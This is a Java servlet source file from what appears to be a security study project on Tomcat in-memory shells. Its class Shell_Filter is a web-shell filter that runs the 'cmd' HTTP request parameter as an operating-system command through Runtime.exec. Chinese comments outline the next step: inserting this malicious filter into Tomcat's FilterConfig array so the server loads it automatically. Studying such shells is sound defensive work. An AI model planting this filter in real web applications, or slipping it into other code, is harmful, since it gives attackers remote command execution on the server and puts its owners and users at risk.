package com.madaha.codesecmemshell.filter;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import java.io.IOException;


// 先来实现一个恶意的Filter；接着开启debug模式看一下调用栈；最后梳理过程实现内存马。
// 关键点：所以关键就是将恶意Filter的信息添加进FilterConfig数组中，这样Tomcat在启动时就会自动初始化我们的恶意Filter。

//@WebFilter("/*")
public class Shell_Filter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {}

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        String cmd = servletRequest.getParameter("cmd");
        if (cmd != null) {
            try {
                Runtime.getRuntime().exec(cmd);
            } catch (IOException e){
                e.printStackTrace();
            } catch (NullPointerException n) {
                n.printStackTrace();
            }
        }
    }

    @Override
    public void destroy() {}
}
